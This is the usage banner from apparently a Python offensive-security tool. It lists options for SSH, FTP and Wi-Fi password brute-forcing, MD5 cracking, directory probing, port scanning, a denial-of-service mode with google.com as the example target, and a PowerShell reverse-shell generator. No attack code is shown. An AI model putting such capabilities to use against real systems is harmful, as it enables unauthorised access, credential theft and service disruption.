{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 

{color.RED}                                                  
Options:
{color.YELLOW}
    ________________________________________SSH CHECKER______________________________________________
    -t  , --type \t\t {color.WHITE}Specify the service             |{color.YELLOW} --type ssh 
    -ps , --pas  \t\t {color.WHITE}Password                        |{color.YELLOW} --pas password
    -ho , --host \t\t {color.WHITE}Host IP                         |{color.YELLOW} --host 192.168.0.0
    -u  , --user \t\t {color.WHITE}Username                        |{color.YELLOW} --user username
    -p  , --port \t\t {color.WHITE}Port                            |{color.YELLOW} --port 22
    -pf , --pfile\t\t {color.WHITE}Password file                   |{color.YELLOW} --pfile password.txt
    -uf , --ufile\t\t {color.WHITE}Username file                   |{color.YELLOW} --ufile username.txt
    
    
    ________________________________________FTP CHECKER______________________________________________
    -t  , --type \t\t {color.WHITE}Specify the service             |{color.YELLOW} --type ftp 
    -ps , --pas  \t\t {color.WHITE}Password                        |{color.YELLOW} --pas password
    -ho , --host \t\t {color.WHITE}Host IP                         |{color.YELLOW} --host 192.168.0.0
    -u  , --user \t\t {color.WHITE}Username                        |{color.YELLOW} --user username
    -p  , --port \t\t {color.WHITE}Port                            |{color.YELLOW} --port 21
    -pf , --pfile\t\t {color.WHITE}Password file                   |{color.YELLOW} --pfile password.txt
    -uf , --ufile\t\t {color.WHITE}Username file                   |{color.YELLOW} --ufile username.txt


    ________________________________________CHECK DIR THE SITE________________________________________
    -ho , --host  \t\t {color.WHITE}Host IP                         |{color.YELLOW} --host 192.168.0.0
    -fp , --fipath \t\t {color.WHITE}File path                       |{color.YELLOW} --fipath dir.txt 

    
    ________________________________________DECRYPT MD5________________________________________________
    -fh , --fhash \t\t {color.WHITE}Hash file                       |{color.YELLOW} --fhash password.txt
    -th , --thash \t\t {color.WHITE}Hash type                       |{color.YELLOW} --thash MD5
    -hs , --hash \t\t {color.WHITE}The hash                        |{color.YELLOW} --hash 25d55ad283aa400af464c76d713c07ad
    
    
    ________________________________________DECODE BASE64______________________________________________
    -fh , --fhash \t\t {color.WHITE}Hash file                       |{color.YELLOW} --fhash password.txt
    -th , --thash \t\t {color.WHITE}Hash type                       |{color.YELLOW} --thash BASE64
    -sh , --hash \t\t {color.WHITE}The hash                        |{color.YELLOW} --hash MTIzNDU2Nzg=
    

    ________________________________________WIFI CHECKER_______________________________________________
    -t   , --type \t\t {color.WHITE}Specify the service             |{color.YELLOW} --type checkfi
    -ho  , --host  \t\t {color.WHITE}Wifi name (SSID)                |{color.YELLOW} --host SSID
    -pfi , --passfi \t\t {color.WHITE}Password file                   |{color.YELLOW} --passfi password.txt    


    ________________________________________GET WIFI___________________________________________________
    -t  , --type \t\t {color.WHITE}Specify the service             |{color.YELLOW} --type getfi
                                                                                                                                                                                                                                             
                                                                                         
                                                                                         
    ________________________________________DOS ATTACK_________________________________________________
    -do  , --dos \t\t {color.WHITE}Enable DoS attack               |{color.YELLOW} --dos true            
    -ho  , --host \t\t {color.WHITE}Host IP & domain                |{color.YELLOW} --host google.com     
    -p   , --port \t\t {color.WHITE}Port                            |{color.YELLOW} --port 22             
                                                                                         
                                                                                         
    ________________________________________POWERSHELL REVERSE_________________________________________
    -po  , --pshell \t\t {color.WHITE}Enable PowerShell reverse       |{color.YELLOW} --pshell true         
    -lho , --lhost\t\t {color.WHITE}Local host                      |{color.YELLOW} --lhost 192.168.1.1
    -n   , --name\t\t {color.WHITE}Name file                       |{color.YELLOW} --name shell.ps1

    ________________________________________SCAN PORTS_________________________________________________
    -ho , --host  \t\t {color.WHITE}Host IP                         |{color.YELLOW} --host 192.168.0.0    
    -t  , --type \t\t {color.WHITE}Specify the service             |{color.YELLOW} --type scan
"""
        )
